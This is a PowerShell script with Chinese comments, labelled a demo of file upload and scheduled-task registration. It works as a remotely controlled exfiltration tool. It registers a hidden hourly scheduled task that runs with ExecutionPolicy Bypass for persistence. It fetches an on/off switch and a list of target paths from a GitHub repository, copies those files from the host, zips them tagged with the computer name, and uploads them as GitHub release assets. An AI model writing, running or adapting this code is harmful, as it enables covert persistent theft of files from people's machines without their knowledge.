# 单文件合并版上传+计划任务注册脚本示范
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 配置部分
$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
$taskName = "console"
$scriptPath = "$PSScriptRoot\console.ps1"  # 计划任务调用脚本路径，可以改成同脚本路径或固定路径
if (-not $token) {
    Write-Host "❌ GH_TOKEN 未设置，脚本终止"
    exit 1
}

# 上传开关URL和路径列表URL
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

# 注册计划任务（如果不存在）
$taskExists = schtasks /Query /TN $taskName 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "🛠️ 计划任务 $taskName 不存在，开始注册..."
    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    schtasks /Create /TN $taskName /TR $taskRun /SC HOURLY /ST 00:00 /RI 60 /F
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✅ 计划任务注册成功"
    } else {
        Write-Host "❌ 计划任务注册失败，请以管理员身份运行本脚本"
        exit 1
    }
} else {
    Write-Host "ℹ️ 计划任务 $taskName 已存在，跳过注册"
}

# 检查上传开关
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "🛑 上传开关未启用，脚本退出"
        exit 0
    }
} catch {
    Write-Warning "❌ 无法读取上传开关：$($_.Exception.Message)"
    exit 1
}

# 读取路径列表
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
    Write-Host "`n📦 上传路径列表："
    $uploadPaths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ 无法读取路径配置：$($_.Exception.Message)"
    exit 1
}

# 创建临时目录
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 复制文件及目录（不判断锁定，尽力复制）
foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Write-Warning "⚠️ 路径不存在，跳过：$path"
        continue
    }
    $item = Get-Item $path -Force
    try {
        if ($item.PSIsContainer) {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "📁 复制目录：$($item.FullName)"
        } else {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
            Write-Host "📄 复制文件：$($item.FullName)"
        }
    } catch {
        Write-Warning "⚠️ 无法复制：$($item.FullName)"
    }
}

# 压缩成 ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
    Write-Host "📦 压缩成功：$zipPath"
} catch {
    Write-Warning "❌ 压缩失败：$($_.Exception.Message)"
    Remove-Item $tempDir -Recurse -Force
    exit 1
}

Remove-Item $tempDir -Recurse -Force

# 上传到 GitHub Release
$uploadUrl = "https://api.github.com/repos/$repo/releases"
$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "upload-script"
    Accept        = "application/vnd.github+json"
}

try {
    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
        tag_name   = $tag
        name       = $tag
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3)

    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "upload-script"
    } -InFile $zipPath

    Write-Host "`n✅ 上传成功：$tag.zip"
} catch {
    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
}

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
